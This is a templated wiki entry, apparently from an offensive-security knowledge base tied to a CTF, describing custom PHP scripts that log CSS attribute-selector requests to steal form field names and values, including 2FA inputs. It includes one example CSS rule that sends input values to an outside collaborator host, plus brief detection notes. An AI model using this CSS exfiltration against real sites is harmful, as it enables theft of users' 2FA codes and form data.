---
url: null
tags:
  - exfiltration
  - css-keylogger
type: tool
verified: false
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:58.139Z'
id: fd6c0933-acb1-4445-b379-d2c634613f46
validated: true
submitted: true
---
# Custom-PHP-Exfiltration-Scripts

**Status**: Unverified

## Overview

Custom PHP scripts (input-finder.php, value-finder.php, failed.php) hosted on a collaborator server to detect and exfiltrate form input names and values via CSS.

## Description

These scripts log HTTP requests from CSS attribute selectors, identifying 2FA field names and brute-forcing values.

## Features

- Feature 1: Logging of CSS exfil requests
- Feature 2: Detection of input attributes
- Feature 3: Value enumeration support

## Installation

### Requirements

- PHP server (e.g., collaborator)

### Install Commands

Upload scripts to web server.

## Basic Usage

Access via CSS url() in app_style.

### Common Options

N/A.

## Examples

### Example 1: Basic Usage

CSS: input[value="h1ctf{...}"] { background: url(https://collab/input-finder.php?val=$value); }

### Example 2: Advanced Usage

Chain with Burp for brute.

## MITRE ATT&CK Mapping

### Techniques

- [[Exfiltration Over Alternative Protocol]] Exfiltration Over Alternative Protocol

### Tactics

- [[Exfiltration]] Exfiltration

## Detection

- External CSS loads
- Unusual DNS to collaborator

## Related Procedures

- [[procedures/CEO-Takeover-and-Final-2FA-Bypass]]

## Related Tools

- [[tools/Burp-Suite]]

## References

Custom for CSS keyloggers.
